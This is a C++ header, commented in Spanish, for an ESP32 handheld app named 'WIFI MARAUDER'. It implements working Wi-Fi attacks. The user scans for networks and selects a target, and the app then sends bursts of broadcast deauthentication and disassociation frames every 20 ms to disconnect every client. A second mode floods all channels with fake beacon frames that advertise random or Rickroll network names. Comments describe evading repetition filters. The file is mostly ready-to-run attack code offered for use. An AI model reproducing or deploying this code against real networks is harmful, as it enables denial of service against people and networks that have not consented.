#ifndef APPWIFI_H
#define APPWIFI_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h" 
#include <WiFi.h>
#include "esp_wifi.h"
#include "soc/rtc_cntl_reg.h" 

#define LED_PIN 48
#define SPAM_LIST_SIZE 32 // Capacidad máxima de la lista de Spam

// Estructura para mantener BSSIDs (MACs) fijos por cada SSID falso
struct FakeAP {
    char ssid[33];
    uint8_t mac[6];
};

class AppWiFi : public App {
private:
    enum EstadoWiFi { MENU_PRINCIPAL, SCAN_WIFI, LISTA_WIFI, ATACANDO_DEAUTH, ATACANDO_BEACON };
    EstadoWiFi estado = MENU_PRINCIPAL;

    int indiceMenu = 0;
    String opcionesMenu[3] = {"1. SCAN & DEAUTH", "2. SPAM (RANDOM)", "3. SPAM (RICKROLL)"};

    int n_redes = 0;
    int indiceSeleccionado = 0;
    uint8_t macObjetivo[6];
    int canalObjetivo = 1;
    String nombreObjetivo = "";

    unsigned long ultimoParpadeo = 0;
    unsigned long ultimoMovimiento = 0;
    unsigned long ultimoAtaque = 0;
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;
    unsigned long inicioEscaneo = 0;
    int segundosRestantes = 4;
    bool estadoLed = false;
    bool pantallaActualizada = false;
    bool btnAnterior = false;

    // --- Variables Ofensivas Optimizadas ---
    int tipoBeacon = 0; 
    long paquetesEnviados = 0;
    uint16_t seqNum = 0; // Número de secuencia para evadir filtros de repetición

    FakeAP listaSpam[SPAM_LIST_SIZE];
    int numFakeAPs = 0;

    const char* rickrollList[8] = {
        "01 Never gonna give you up",
        "02 Never gonna let you down",
        "03 Never gonna run around",
        "04 and desert you",
        "05 Never gonna make you cry",
        "06 Never gonna say goodbye",
        "07 Never gonna tell a lie",
        "08 and hurt you"
    };

    uint8_t beacon_template[38] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00,                         
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x64, 0x00,                         
        0x01, 0x04,                         
        0x00, 0x00                          
    };

    String generarSSIDRandom() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        String ssid = "";
        int len = random(6, 12);
        for(int i=0; i<len; i++) ssid += chars[random(chars.length())];
        return ssid;
    }

    void generarListaSpam() {
        if (tipoBeacon == 1) { // ALEATORIO
            numFakeAPs = SPAM_LIST_SIZE;
            for(int i=0; i<numFakeAPs; i++) {
                String s = generarSSIDRandom();
                s.toCharArray(listaSpam[i].ssid, 33);
                for(int j=0; j<6; j++) listaSpam[i].mac[j] = random(256);
                listaSpam[i].mac[0] = 0x02; // MAC Local administrada
            }
        } else { // RICKROLL
            numFakeAPs = 8;
            for(int i=0; i<numFakeAPs; i++) {
                strncpy(listaSpam[i].ssid, rickrollList[i], 33);
                for(int j=0; j<6; j++) listaSpam[i].mac[j] = random(256);
                listaSpam[i].mac[0] = 0x02; 
            }
        }
    }

    void lanzarRafagaBeacons() {
        uint8_t packet[128];
        for(int i = 0; i < numFakeAPs; i++) {
            memcpy(packet, beacon_template, 38);
            
            // Inyectar MAC persistente
            memcpy(&packet[10], listaSpam[i].mac, 6);
            memcpy(&packet[16], listaSpam[i].mac, 6);
            
            // Inyectar Secuencia Dinámica
            packet[22] = (seqNum & 0x0F) << 4;
            packet[23] = (seqNum & 0xFF0) >> 4;
            seqNum++;

            int len = strlen(listaSpam[i].ssid);
            if(len > 32) len = 32; 
            packet[37] = len;
            memcpy(&packet[38], listaSpam[i].ssid, len);
            
            // Canal aleatorio por cada AP falso para saturar todo el espectro
            uint8_t ch = random(1, 12);
            uint8_t tail[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, ch };
            memcpy(packet + 38 + len, tail, sizeof(tail));
            
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + len + sizeof(tail), false);
            paquetesEnviados++;
        }
    }

    void lanzarRafagaDeauth() {
        uint8_t packet[26] = {
            0xC0, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast (Desconectar a todos)
            macObjetivo[0], macObjetivo[1], macObjetivo[2], macObjetivo[3], macObjetivo[4], macObjetivo[5], // AP
            macObjetivo[0], macObjetivo[1], macObjetivo[2], macObjetivo[3], macObjetivo[4], macObjetivo[5], // BSSID
            0x00, 0x00, // Secuencia
            0x00, 0x00  // Razón
        };

        // Escudo Anti-Repetición
        packet[22] = (seqNum & 0x0F) << 4;
        packet[23] = (seqNum & 0xFF0) >> 4;
        seqNum++;

        // Códigos de Razón de Alta Eficacia (1=Unspecified, 4=Inactivity, 8=Leaving)
        uint8_t razones[] = {1, 4, 8, 7};
        
        // 1. Ráfaga Deauth (0xC0)
        packet[0] = 0xC0;
        for(int i = 0; i < 4; i++) {
            packet[24] = razones[i];
            esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
        }

        // 2. Ráfaga Disassociation (0xA0) - Ignora bloqueos de capa 2
        packet[0] = 0xA0;
        for(int i = 0; i < 4; i++) {
            packet[24] = razones[i];
            esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
        }
    }

    // --- ACTIVACIÓN SEGURA ANTI-BROWNOUT ---
    void activarModoAtaque(int canal) {
        WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); 
        WiFi.disconnect(true);
        WiFi.mode(WIFI_AP_STA); 
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_max_tx_power(60); // Mantener en 60 o 64 para estabilidad
    }

    void desactivarModoAtaque() {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        esp_wifi_set_max_tx_power(78); 
        WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 1); 
    }

public:
    const char* obtenerNombre() override { return "WIFI MARAUDER"; }
    const uint8_t* obtenerEmoji() override { return emoji_wifi; }
    
    void setup() override {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
    }

    void alEntrar() override {
        estado = MENU_PRINCIPAL;
        indiceMenu = 0;
        pantallaActualizada = false;
        ultimoMovimiento = millis();
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        ultimoFrameNeon = millis();
        anguloNeon = 0;
        desactivarModoAtaque();
    }
    
    void alSalir() override {
        WiFi.scanDelete(); 
        desactivarModoAtaque();
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }

    void loop(Arduino_Canvas* canvas) override {
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        int valHoriz = joyEjeY_esVertical ? analogRead(JOY_X) : analogRead(JOY_Y);

        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool izq = joyInvHorizontal ? (valHoriz > 3200) : (valHoriz < 800);
        bool der = joyInvHorizontal ? (valHoriz < 800) : (valHoriz > 3200);

        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // ==========================================
        // ESTADO 0: MENÚ PRINCIPAL
        // ==========================================
        if (estado == MENU_PRINCIPAL) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenu--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenu++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenu < 0) indiceMenu = 2;
                if (indiceMenu > 2) indiceMenu = 0;
            }

            if (clicSimple) {
                if (indiceMenu == 0) { 
                    estado = SCAN_WIFI; 
                    inicioEscaneo = millis();
                    segundosRestantes = 4;
                    WiFi.scanNetworks(true);
                } else {
                    estado = ATACANDO_BEACON;
                    tipoBeacon = (indiceMenu == 1) ? 1 : 2;
                    paquetesEnviados = 0;
                    seqNum = 0;
                    generarListaSpam(); // <-- Crear la lista fija de redes falsas
                    activarModoAtaque(1); 
                }
                pantallaActualizada = false;
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                Launcher::dibujarTextoCentrado(canvas, "WIFI MARAUDER", 40, 1, IRON_CYAN);
                canvas->drawLine(20, 50, 220, 50, IRON_DARK);

                for (int i = 0; i < 3; i++) {
                    int yPos = 80 + (i * 35);
                    
                    if (i == indiceMenu) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_RED);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, WHITE);
                        Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, WHITE);
                    } else {
                        Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, IRON_BLUE);
                    }
                }
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("MANTENER CLICK");
                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 1: ESCANEANDO EL AIRE
        // ==========================================
        else if (estado == SCAN_WIFI) {
            if (millis() - ultimoParpadeo > 200) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0); 
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            int transcurrido = (millis() - inicioEscaneo) / 1000;
            int nuevoRestante = 4 - transcurrido;
            if (nuevoRestante < 0) nuevoRestante = 0;
            if (nuevoRestante != segundosRestantes) segundosRestantes = nuevoRestante;

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 
                canvas->drawArc(120, 120, 117, 113, (anguloNeon + 20) % 360, (anguloNeon + 50) % 360, IRON_RED); 

                Launcher::dibujarTextoCentrado(canvas, "WIFI SCAN", 100, 2, IRON_RED);
                char tiempoStr[32]; sprintf(tiempoStr, "Termina en: %d s", segundosRestantes);
                Launcher::dibujarTextoCentrado(canvas, tiempoStr, 130, 1, WHITE);
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("MANTENER CLICK");
                canvas->flush();
                pantallaActualizada = true;
            }

            if (segundosRestantes == 0) {
                int16_t scanRes = WiFi.scanComplete();
                if (scanRes >= 0) {
                    n_redes = scanRes;
                    estado = LISTA_WIFI;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                } else if (scanRes == WIFI_SCAN_FAILED) {
                    WiFi.scanNetworks(true);
                    inicioEscaneo = millis();
                }
            }
        }
        // ==========================================
        // ESTADO 2: LISTA DE OBJETIVOS
        // ==========================================
        else if (estado == LISTA_WIFI) {
            if (millis() - ultimoMovimiento > 250) {
                if (arriba) { indiceSeleccionado--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo) { indiceSeleccionado++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (izq) { estado = MENU_PRINCIPAL; pantallaActualizada = false; ultimoMovimiento = millis(); }

                if (indiceSeleccionado < 0) indiceSeleccionado = (n_redes > 0) ? n_redes - 1 : 0;
                if (indiceSeleccionado >= n_redes) indiceSeleccionado = 0;

                if ((clicSimple || der) && n_redes > 0) {
                    nombreObjetivo = WiFi.SSID(indiceSeleccionado);
                    canalObjetivo = WiFi.channel(indiceSeleccionado);
                    uint8_t* bssid = WiFi.BSSID(indiceSeleccionado);
                    
                    for(int i = 0; i < 6; i++) macObjetivo[i] = bssid[i];
                    
                    activarModoAtaque(canalObjetivo);
                    seqNum = 0; // Reiniciar contador de secuencia
                    estado = ATACANDO_DEAUTH;
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                    ultimoAtaque = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                
                char titulo[32]; sprintf(titulo, "REDES WIFI (%d)", n_redes);
                Launcher::dibujarTextoCentrado(canvas, titulo, 30, 1, IRON_CYAN);
                canvas->drawLine(20, 40, 220, 40, IRON_DARK);

                if (n_redes == 0) {
                    Launcher::dibujarTextoCentrado(canvas, "NO HAY REDES", 110, 2, IRON_BLUE);
                } else {
                    int inicio = indiceSeleccionado - 1;
                    if (inicio < 0) inicio = 0;
                    if (n_redes > 3 && inicio > n_redes - 3) inicio = n_redes - 3;

                    for (int i = 0; i < 3 && (inicio + i) < n_redes; i++) {
                        int idx = inicio + i;
                        int yPos = 65 + (i * 35);
                        canvas->setTextSize(1);
                        canvas->setCursor(25, yPos);
                        
                        String ssidStr = WiFi.SSID(idx);
                        if(ssidStr.length() > 11) ssidStr = ssidStr.substring(0, 11);
                        
                        if (idx == indiceSeleccionado) {
                            canvas->fillRoundRect(10, yPos - 10, 220, 25, 3, IRON_RED);
                            canvas->fillTriangle(15, yPos-2, 15, yPos+6, 20, yPos+2, WHITE);
                            canvas->setTextColor(WHITE);
                        } else {
                            canvas->setTextColor(IRON_BLUE);
                        }
                        canvas->print(String(idx + 1) + ". " + ssidStr + " [" + String(WiFi.RSSI(idx)) + "]");
                    }
                    Launcher::dibujarTextoCentrado(canvas, "Clic/Der = ATACAR", 170, 1, IRON_RED);
                    Launcher::dibujarTextoCentrado(canvas, "< Volver = Izq", 185, 1, IRON_DARK);
                }
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("MANTENER CLICK");
                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 3: ATACANDO (DEAUTH INJECTION)
        // ==========================================
        else if (estado == ATACANDO_DEAUTH) {
            if (millis() - ultimoParpadeo > 50) { // Parpadeo agresivo rojo/blanco
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0);
                else neopixelWrite(LED_PIN, 255, 255, 255);
            }

            // Rafagas Masivas cada 20ms
            if (millis() - ultimoAtaque > 20) {
                ultimoAtaque = millis();
                lanzarRafagaDeauth();
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    desactivarModoAtaque();
                    estado = MENU_PRINCIPAL;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 

                Launcher::dibujarTextoCentrado(canvas, "DEAUTH ATTACK", 35, 1, IRON_RED);
                canvas->drawLine(30, 45, 210, 45, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, nombreObjetivo.substring(0, 18).c_str(), 75, 2, WHITE);
                
                char macStr[32];
                sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                        macObjetivo[0], macObjetivo[1], macObjetivo[2], 
                        macObjetivo[3], macObjetivo[4], macObjetivo[5]);
                Launcher::dibujarTextoCentrado(canvas, macStr, 105, 1, IRON_BLUE);

                char chStr[32]; sprintf(chStr, "Canal: %d", canalObjetivo);
                Launcher::dibujarTextoCentrado(canvas, chStr, 125, 1, IRON_CYAN);

                Launcher::dibujarTextoCentrado(canvas, "EXPULSANDO USUARIOS...", 150, 1, IRON_RED);
                Launcher::dibujarTextoCentrado(canvas, "< Volver = Clic/Izq", 175, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("MANTENER CLICK");
                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 4: BEACON SPAM
        // ==========================================
        else if (estado == ATACANDO_BEACON) {
            
            if (millis() - ultimoParpadeo > 80) { 
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 0, 255, 255); // Cian
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            // Inyectar el bloque completo de 8 a 32 APs cada 100ms
            if (millis() - ultimoAtaque > 100) { 
                ultimoAtaque = millis();
                lanzarRafagaBeacons();
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    desactivarModoAtaque();
                    estado = MENU_PRINCIPAL;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 

                Launcher::dibujarTextoCentrado(canvas, "BEACON SPAM", 40, 2, IRON_CYAN);
                canvas->drawLine(20, 60, 220, 60, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, tipoBeacon == 1 ? "Modo: ALEATORIO (x32)" : "Modo: RICKROLL (x8)", 85, 1, IRON_CYAN);
                Launcher::dibujarTextoCentrado(canvas, "Inundando el aire...", 110, 1, WHITE);
                
                char chStr[32]; sprintf(chStr, "Inyectados: %ld", paquetesEnviados);
                Launcher::dibujarTextoCentrado(canvas, chStr, 140, 1, IRON_GREEN);

                Launcher::dibujarTextoCentrado(canvas, "< Detener = Clic/Izq", 175, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("MANTENER CLICK");
                canvas->flush();
                pantallaActualizada = true;
            }
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif